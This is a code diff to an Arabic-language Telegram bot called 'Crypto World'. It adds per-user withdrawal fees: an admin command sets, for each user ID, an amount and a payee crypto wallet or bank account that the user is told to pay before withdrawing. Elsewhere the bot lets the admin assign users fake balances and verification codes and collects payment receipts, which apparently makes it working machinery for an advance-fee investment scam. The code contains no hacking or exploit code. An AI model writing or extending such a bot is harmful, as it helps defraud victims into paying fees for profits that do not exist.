@@ -45,6 +45,7 @@ def load_data():
             "network": "BNB Smart Chain (BEP20)",
             "address": "0x4aaf2231199d24842e606f99b4f69bb5cddb171e"
         },
+        "user_fees": {},  # لحفظ رسوم السحب المخصصة لكل مستخدم عبر الـ ID
         "all_users": []
     }
 
@@ -55,6 +56,7 @@ def save_data_to_file():
             "custom_data": user_custom_data,
             "profits": custom_profits,
             "fee_info": withdraw_fee_info,
+            "user_fees": user_specific_fees,
             "all_users": list(all_users_set)
         }
         with open(DATA_FILE, "w", encoding="utf-8") as f:
@@ -73,6 +75,7 @@ withdraw_fee_info = db.get("fee_info", {
     "network": "BNB Smart Chain (BEP20)",
     "address": "0x4aaf2231199d24842e606f99b4f69bb5cddb171e"
 })
+user_specific_fees = db.get("user_fees", {})
 all_users_set = set(db.get("all_users", []))
 
 # تقدير عمر الحساب بناءً على الـ ID
@@ -88,7 +91,7 @@ def estimate_account_age(user_id: int) -> str:
     else:
         return "حساب حديث نسبياً (وتم إنشاؤه في السنوات الأخيرة)"
 
-# أمر الأدمن لتعديل تفاصيل رسوم السحب للجميع: /setwithdrawfee <المبلغ> <العملة> <الشبكة/البنك> <العنوان/الحساب>
+# أمر الأدمن لتعديل رسوم السحب العامة للجميع: /setwithdrawfee
 async def set_withdraw_fee_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
@@ -98,9 +101,7 @@ async def set_withdraw_fee_command(update: Update, context: ContextTypes.DEFAULT
         await update.message.reply_text(
             "⚠️ **طريقة الاستخدام غير صحيحة!**\n"
             "اكتب الأمر بهذا الشكل:\n"
-            "`/setwithdrawfee <المبلغ> <العملة> <الشبكة_أو_البنك> <العنوان_أو_الحساب>`\n\n"
-            "مثال SAR:\n`/setwithdrawfee 2000 SAR الراجحي 260000010006080404601`\n\n"
-            "مثال USDT:\n`/setwithdrawfee 1997 USDT BEP20 0x4aaf...`",
+            "`/setwithdrawfee <المبلغ> <العملة> <الشبكة_أو_البنك> <العنوان_أو_الحساب>`",
             parse_mode="Markdown"
         )
         return
@@ -117,14 +118,52 @@ async def set_withdraw_fee_command(update: Update, context: ContextTypes.DEFAULT
     save_data_to_file()
 
     await update.message.reply_text(
-        f"✅ **تم تحديث تفاصيل رسوم السحب بنجاح لتظهر لجميع المستخدمين!**\n\n"
+        f"✅ **تم تحديث رسوم السحب العامة بنجاح!**\n\n"
         f"• المبلغ: `{amount} {currency}`\n"
         f"• البنك / الشبكة: `{network}`\n"
         f"• الحساب / العنوان:\n`{address}`",
         parse_mode="Markdown"
     )
 
-# أمر الأدمن للإذاعة وإرسال رسالة لجميع المستخدمين: /broadcast <الرسالة>
+# أمر الأدمن لتخصيص رسوم سحب لمستخدم معين بالـ ID: /setuserfee
+async def set_user_fee_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return
+
+    args = context.args
+    if len(args) < 5:
+        await update.message.reply_text(
+            "⚠️ **طريقة الاستخدام غير صحيحة!**\n"
+            "اكتب الأمر بهذا الشكل:\n"
+            "`/setuserfee <معرف_المستخدم> <المبلغ> <العملة> <الشبكة_أو_البنك> <العنوان_أو_الحساب>`\n\n"
+            "مثال:\n`/setuserfee 8968241467 2000 SAR الراجحي 260000010006080404601`",
+            parse_mode="Markdown"
+        )
+        return
+
+    target_user_id = args[0].strip()
+    amount = args[1].strip()
+    currency = args[2].upper()
+    network = args[3]
+    address = " ".join(args[4:])
+
+    user_specific_fees[target_user_id] = {
+        "amount": amount,
+        "currency": currency,
+        "network": network,
+        "address": address
+    }
+    save_data_to_file()
+
+    await update.message.reply_text(
+        f"✅ **تم تخصيص رسوم السحب للمستخدم `{target_user_id}` بنجاح!**\n\n"
+        f"• المبلغ: `{amount} {currency}`\n"
+        f"• البنك / الشبكة: `{network}`\n"
+        f"• الحساب / العنوان:\n`{address}`",
+        parse_mode="Markdown"
+    )
+
+# أمر الأدمن للإذاعة لجميع المستخدمين: /broadcast
 async def broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
@@ -134,7 +173,7 @@ async def broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "⚠️ **طريقة الاستخدام غير صحيحة!**\n"
             "اكتب الأمر بهذا الشكل:\n"
-            "`/broadcast <الرسالة المراد إرسالها للجميع>`",
+            "`/broadcast <الرسالة>`",
             parse_mode="Markdown"
         )
         return
@@ -160,7 +199,7 @@ async def broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="Markdown"
     )
 
-# أمر الأدمن لتحديد المبلغ ورقم التحقق لزبون معين بدقة
+# أمر الأدمن لتحديد الرصيد وكود التحقق لمستخدم معين: /setprofit
 async def set_profit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
@@ -170,8 +209,7 @@ async def set_profit(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "⚠️ **طريقة الاستخدام غير صحيحة!**\n"
             "اكتب الأمر بهذا الشكل:\n"
-            "`/setprofit <معرف_المستخدم> <المبلغ> <رقم_التحقق>`\n\n"
-            "مثال:\n`/setprofit 8968241467 2000 3585556`",
+            "`/setprofit <معرف_المستخدم> <المبلغ> <رقم_التحقق>`",
             parse_mode="Markdown"
         )
         return
@@ -190,12 +228,11 @@ async def set_profit(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"✅ **تم تخصيص الرصيد ورقم التحقق بنجاح!**\n\n"
         f"• معرف المستخدم: `{target_user_id}`\n"
         f"• الرصيد المتاح: `{amount} SAR`\n"
-        f"• رقم التحقق الخاص به: `{code}`\n\n"
-        "🔒 هذا الرقم مرتبط به وحده (ولا يحترق، بل يظل فعالاً دائماً).",
+        f"• رقم التحقق الخاص به: `{code}`",
         parse_mode="Markdown"
     )
 
-# أمر عرض الأكواد والمراجع الفعّالة للأدمن
+# أمر عرض الأكواد للأدمن
 async def admin_get_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
@@ -230,7 +267,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=ReplyKeyboardRemove()
     )
 
-# معالجة الصور (إيصالات دفع الرسوم المرفوعة من الزبون)
+# معالجة الصور (إيصالات الدفع)
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = str(user.id)
@@ -292,7 +329,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.reply_text("لقد أكملت الإجراءات بالفعل ولا داعي للتكرار. يمكنك التواصل مع الدعم الفني.")
         return
 
-    # التحقق الصارم لبيانات التسجيل (بدون كشف الكلمة السرية للمستخدم)
     if current_state == "waiting_for_subscription_text":
         if text.startswith("خطوات التسجيل والإشتراك") or text.startswith("خطوات التسجيل والاشتراك"):
             user_custom_data[user_id] = text
@@ -480,14 +516,16 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
     elif data == "pay_fees":
-        # عرض تفاصيل رسوم السحب التي حددتها أنت بالأمر /setwithdrawfee
+        # التحقق مما إذا كان للمستخدم رسوم مخصصة عبر الـ ID الخاص به، وإذا لم توجد نستخدم الرسوم العامة
+        fee_data = user_specific_fees.get(user_id, withdraw_fee_info)
+        
         pay_details = (
             "💳 **دفع رسوم السحب:**\n\n"
-            f"العملة: **{withdraw_fee_info['currency']}**\n"
-            f"المبلغ: **{withdraw_fee_info['amount']} {withdraw_fee_info['currency']}**\n"
-            f"الشبكة / البنك: **{withdraw_fee_info['network']}**\n\n"
+            f"العملة: **{fee_data['currency']}**\n"
+            f"المبلغ: **{fee_data['amount']} {fee_data['currency']}**\n"
+            f"الشبكة / البنك: **{fee_data['network']}**\n\n"
             "الحساب / العنوان:\n"
-            f"`{withdraw_fee_info['address']}`\n\n"
+            f"`{fee_data['address']}`\n\n"
             "يرجى تحويل مبلغ الرسوم المطلوبة، ثم إرسال صورة الوصل (Screenshot) هنا في المحادثة ليتم تأكيد سحبك بنجاح."
         )
         await query.edit_message_text(
@@ -505,12 +543,13 @@ def main():
     app.add_handler(CommandHandler("codes", admin_get_codes))
     app.add_handler(CommandHandler("setprofit", set_profit))
     app.add_handler(CommandHandler("broadcast", broadcast_message))
-    app.add_handler(CommandHandler("setwithdrawfee", set_withdraw_fee_command))  # أمر تعديل رسوم السحب الشامل
+    app.add_handler(CommandHandler("setwithdrawfee", set_withdraw_fee_command))  # الرسوم العامة
+    app.add_handler(CommandHandler("setuserfee", set_user_fee_command))        # الرسوم الخاصة لكل مستخدم عبر الـ ID
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     app.add_handler(CallbackQueryHandler(button_handler))
 
-    print("🤖 بوت (عالم الكريبتو | Crypto World) يعمل بكفاءة تامة...")
+    print("🤖 بوت (عالم الكريبتو | Crypto World) يعمل بكفاءة تامة مع نظام الرسوم المخصصة لكل مستخدم...")
     app.run_polling()
 
 if __name__ == "__main__":
